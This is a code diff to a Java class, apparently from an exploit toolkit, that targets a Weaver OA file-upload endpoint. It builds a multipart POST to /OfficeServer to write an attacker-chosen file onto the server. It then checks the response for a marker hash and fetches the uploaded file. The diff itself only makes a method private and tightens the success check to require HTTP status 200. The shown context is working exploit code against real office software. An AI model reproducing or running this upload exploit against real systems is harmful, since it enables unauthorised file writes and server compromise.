@@ -26,7 +26,7 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface{
         return att;
     }
 
-    public Boolean att(String url,String path,TextArea textArea,String filename){
+    private Boolean att(String url,String path,TextArea textArea,String filename){
         this.headers.put("Content-Type","multipart/form-data;boundary=----WebKitFormBoundarymVk33liI64J7GQaK");
         String fir_post = "------WebKitFormBoundarymVk33liI64J7GQaK\r\n" +
                 "Content-Disposition: form-data; name=\"secId\"\r\n" +
@@ -64,7 +64,7 @@ public class weaveroa_workrelate_uploadOperation implements Exploitlnterface{
                     "------WebKitFormBoundarymVk33liI64J7GQaK--";
 
             Response sec = HttpTools.post(url + "/OfficeServer", sec_post, this.headers, "utf-8");
-            if(sec.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
+            if(sec.getCode() == 200 && sec.getText().contains("9df37afc77bdd582d90aefaf4e35c63e")){
 
                 textArea.appendText("\n 释放成功 检测写入状态");
                 Response thired = HttpTools.get(url + "/" + filename, new HashMap<String, String>(), "utf-8");
